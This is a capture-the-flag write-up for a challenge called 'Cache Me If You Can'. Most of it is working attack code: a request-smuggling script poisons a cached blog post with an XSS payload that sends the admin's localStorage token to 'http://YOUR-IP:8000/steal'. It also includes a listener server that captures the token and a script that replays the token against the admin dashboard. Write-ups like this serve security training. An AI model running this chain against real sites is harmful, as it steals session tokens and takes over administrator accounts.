# Cache Me If You Can - Writeup

## Vulnerabilities Explained

1. **HTTP Request Smuggling**
   - Apache config enables both Content-Length and Transfer-Encoding:
   ```apache
   SetEnv proxy-sendchunked 1
   SetEnv proxy-sendcl 1
   HttpProtocolOptions Unsafe
   ```
   - Flask backend has vulnerable smuggling check:
   ```python
   @bp.before_request
   def handle_smuggling():
       if request.method == 'POST':
           content_length = request.headers.get('Content-Length')
           if content_length and int(content_length) > 0:
               # Process normally, allowing for smuggling
               pass
   ```

2. **Cache Poisoning**
   - Apache enables caching with dangerous configuration:
   ```apache
   CacheRoot "/usr/local/apache2/cache"
   CacheEnable disk /
   CacheDefaultExpire 60
   Header add X-Cache-Key "%{REQUEST_URI}e:%{HTTP:X-Special-Key}e"
   ```
   - Special key enables cache control:
   ```apache
   SetEnvIf X-Special-Key "secret_cache_key" ENABLE_CACHE=1
   Header set Cache-Control "public, max-age=60" env=ENABLE_CACHE
   ```

3. **Admin Bot Vulnerability**
   - Bot automatically visits reported posts with admin token:
   ```python
   driver.execute_cdp_cmd('Network.setExtraHTTPHeaders', {
       'headers': {
           'Authorization': f'Bearer {self.admin_token}',
           'X-Admin-Request': 'true'
       }
   })
   ```

## Exploitation Script

```python
import requests
import time

SERVER_URL = "http://SERVER_IP"  # Change this to your target IP

def login_user():
    """Login and get JWT token"""
    login_data = {
        "username": "user",
        "password": "user123"
    }
    r = requests.post(f"{SERVER_URL}/api/auth/login", json=login_data)
    return r.json()['token']

def exploit():
    # Step 1: Login as normal user
    user_token = login_user()
    print(f"[+] Got user token: {user_token[:20]}...")

    # Step 2: Create smuggled request with XSS payload
    xss_payload = '<script>fetch("http://YOUR-IP:8000/steal?" + localStorage.getItem("token"))</script>'
    
    # Craft headers for smuggling
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '4',
        'Transfer-Encoding': 'chunked',
        'Connection': 'keep-alive',
        'X-Special-Key': 'secret_cache_key',
        'Authorization': f'Bearer {user_token}'
    }

    # Create body with smuggled content
    body = (
        "XXXX"  # Matches Content-Length: 4
        "\r\n0\r\n\r\n"  # End chunked request
        "GET /api/blog/post/1 HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "X-Special-Key: secret_cache_key\r\n"
        "Content-Type: application/json\r\n"
        "\r\n"
        f'{{"content": "{xss_payload}"}}'
    )

    # Send smuggled request
    print("[+] Sending smuggled request...")
    r = requests.post(
        f"{SERVER_URL}/api/blog/post/1",
        headers=headers,
        data=body
    )
    print(f"[+] Smuggle response: {r.status_code}")

    # Step 3: Report post to trigger admin visit
    print("[+] Reporting post...")
    headers = {
        'Authorization': f'Bearer {user_token}',
        'Content-Type': 'application/json'
    }
    report_data = {"postId": 1}
    r = requests.post(
        f"{SERVER_URL}/api/blog/report",
        headers=headers,
        json=report_data
    )
    print(f"[+] Report sent: {r.status_code}")

if __name__ == "__main__":
    exploit()
```

## Token Collector Script

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class TokenCollector(BaseHTTPRequestHandler):
    def do_GET(self):
        print("\n=== Captured Admin Token ===")
        token = urllib.parse.unquote(self.path.split('?')[1])
        print(f"Token: {token}")
        print("==========================")
        
        self.send_response(200)
        self.end_headers()

print("[+] Starting token collector on port 8000...")
HTTPServer(('0.0.0.0', 8000), TokenCollector).serve_forever()
```

## Getting the Flag

Once you have the admin token:

1. Login using the stolen token:
```python
import requests

SERVER_URL = "http://SERVER_IP"
ADMIN_TOKEN = "stolen_token_here"

headers = {
    'Authorization': f'Bearer {ADMIN_TOKEN}',
    'Content-Type': 'application/json'
}

r = requests.get(f"{SERVER_URL}/api/admin/dashboard", headers=headers)
print(r.text)  # Contains the flag
```

## Exploitation Steps

1. Run the collector script in one terminal:
```bash
python3 collector.py
```

2. Run the exploit script in another terminal:
```bash
python3 exploit.py
```

3. Wait for admin bot to visit and send their token to your collector

4. Use the captured admin token to access the dashboard and get the flag

The flag will be in the admin dashboard response!